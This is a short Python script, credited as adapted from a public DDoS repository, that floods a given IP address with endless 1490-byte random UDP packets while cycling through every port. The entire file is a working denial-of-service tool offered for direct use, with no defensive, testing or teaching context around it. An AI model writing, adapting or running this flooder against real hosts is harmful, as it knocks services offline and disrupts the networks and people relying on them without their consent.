# This script was adapted from https://github.com/Ha3MrX/DDos-Attack/blob/master/ddos-attack.py
# Full credit to Ha3MrX, I guess

import socket
import random
import argparse

# Options to control the flow of things
parser = argparse.ArgumentParser()
parser.add_argument("--port", "-p", help="Starting port to attack")
parser.add_argument("--address", "-a", help="IP address to attack")
args = parser.parse_args()

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

ip = args.address
port = int(args.port)

sent = 0
while True:
    sock.sendto(bytes, (ip,port))
    sent = sent + 1
    port = port + 1
    print("Sent %s packet to %s throught port:%s" % (sent, ip, port))
    if port == 65534:
        port = 1